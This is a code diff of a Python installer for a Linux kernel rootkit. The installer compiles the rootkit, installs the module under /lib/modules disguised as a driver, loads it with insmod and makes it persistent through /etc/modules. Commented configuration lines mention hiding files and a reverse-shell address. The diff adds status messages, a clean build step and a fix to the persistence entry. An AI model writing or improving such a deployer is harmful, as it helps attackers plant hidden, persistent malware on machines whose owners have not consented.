@@ -161,11 +161,13 @@ def is_module_already_persistent(module_name):
 
 
 def load_module(module_path):
+	print_status("Loading module...")
 	run_cmd_exit_on_fail("insmod {}".format(module_path), run_with_os=True)
 
 
 def unload_module(module_name):
 	if is_module_already_loaded(module_name):
+		print_status("Unloading module...")
 		run_cmd_exit_on_fail("rmmod {}".format(module_name), run_with_os=True)
 
 ####
@@ -181,7 +183,8 @@ def enable_persistence(module_name):
 	print_status("Making rootkit persistent...")
 	if not is_module_already_persistent(module_name):
 		with open("/etc/modules", "a") as f:
-			f.write(module_name + "\n")
+			# If the module name has a .ko extension, get rid of it.
+			f.write("\n" + module_name.replace(".ko", "") + "\n")
 		print_success("Persistence established.")
 
 
@@ -232,6 +235,8 @@ def install(kernel_version):
 	# config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "Garden")
 	# config["REVERSE_SHELL_IP_ADDR"] = prompt("Enter IP address for reverse shell.")
 
+	run_cmd_exit_on_fail("make clean", "./rootkit")
+
 	config_path = "./rootkit/config.h"
 	print_status("Creating config file...")
 	create_config_header_file(config, config_path)
@@ -242,7 +247,7 @@ def install(kernel_version):
 	run_cmd_exit_on_fail("make all", "./rootkit")
 	print_success("Successful compilation.")
 
-	# Move compiled components to the right place. Maybe drop it in "/lib/modules/{0}/garden?
+	# Move compiled components to the right place. Maybe drop it in "/lib/modules/kernel-version/garden?
 	print_status("Installing rootkit...")
 	module_dest_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
 	if not os.path.exists(module_dest_dir):
